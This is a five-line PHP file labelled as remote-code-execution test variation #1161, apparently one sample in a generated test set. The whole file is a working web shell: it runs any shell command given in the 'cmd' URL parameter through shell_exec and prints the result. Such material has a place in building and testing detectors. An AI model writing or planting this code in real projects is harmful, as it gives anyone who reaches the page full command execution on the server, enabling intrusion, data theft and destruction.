<?php
// RCE test variation #1161
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>